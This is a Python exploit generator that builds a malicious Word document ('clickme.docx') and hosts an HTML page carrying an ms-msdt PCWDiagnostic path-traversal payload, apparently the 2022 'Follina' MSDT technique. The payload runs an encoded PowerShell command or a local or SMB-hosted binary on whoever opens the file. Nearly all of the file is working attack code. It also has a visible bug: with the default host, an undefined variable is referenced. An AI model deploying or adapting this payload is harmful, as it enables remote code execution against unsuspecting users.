#!/usr/bin/env python3
import argparse
import os
import zipfile
import http.server
import socketserver
import base64
from urllib.parse import urlparse

# Helper function to zip whole dir
# https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            os.utime(os.path.join(root, file), (1653895859, 1653895859))
            ziph.write(os.path.join(root, file), 
                       os.path.relpath(
                            os.path.join(root, file), 
                            path
                       ))

if __name__ == "__main__":

    # Parse arguments
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('Required Arguments')
    binary = parser.add_argument_group('Binary Execution Arguments')
    command = parser.add_argument_group('Command Execution Arguments')
    optional = parser.add_argument_group('Optional Arguments')
    required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
        help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
    binary.add_argument('-b', '--binary', action='store', dest='binary', 
        help='The full path of the binary to run. Can be local or remote from an SMB share')
    command.add_argument('-c', '--command', action='store', dest='command',
        help='The encoded command to execute in "command" mode')
    optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"')
    optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
        help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
    optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
        help='The port to run the HTTP server on, defaults to 80')
    args = parser.parse_args()

    if args.mode == "binary" and args.binary is None:
        raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")


    if args.mode == "command" and args.command is None:
        raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")

    payload_url = f"http://{args.url}:{args.port}/exploit.html"

    if args.url != "localhost":  # if not default
        url = urlparse(args.url)
    if url.scheme == "":
        raise SystemExit("Custom host mode requires HTTP or HTTPS, e.g. http://example.com")
    if url.scheme == "http":  # assuming that the user has provided the protocol AND path
        payload_url = f"{args.url}"
    elif url.scheme == "https":  # assuming that the user has provided the protocol AND path
        payload_url = f"{args.url}"

    if args.mode == "command":
        # Original PowerShell execution variant
        command = args.command.replace("\"", "\\\"")
        encoded_command = base64.b64encode(bytearray(command, 'utf-16-le')).decode('UTF-8') # Powershell life...
        payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""'''

    if args.mode == "binary":
        # John Hammond binary variant
        binary_path = args.binary.replace('\\', '\\\\').rstrip('.exe')
        payload = fr'"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({binary_path})/.exe\""'

    # Prepare the doc file
    with open("src/document.xml.rels.tpl", "r") as f:
        tmp = f.read()

    payload_rels = tmp.format(payload_url = payload_url)

    if not os.path.exists("src/clickme/word/_rels"):
        os.makedirs("src/clickme/word/_rels")

    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
        f.write(payload_rels)

    with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir('src/clickme/', zipf)

    print("Generated 'clickme.docx' in current directory")


    # Prepare the HTML payload
    if not os.path.exists("www"):
        os.makedirs("www")

    with open("src/exploit.html.tpl", "r") as f:
        tmp = f.read()

    payload_html = tmp.format(payload = payload)

    with open("www/exploit.html", "w") as f:
        f.write(payload_html)

    print("Generated 'exploit.html' in 'www' directory")


    # Host the payload
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="www", **kwargs)

    print(f"Serving payload on {payload_url}")
    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
        httpd.serve_forever()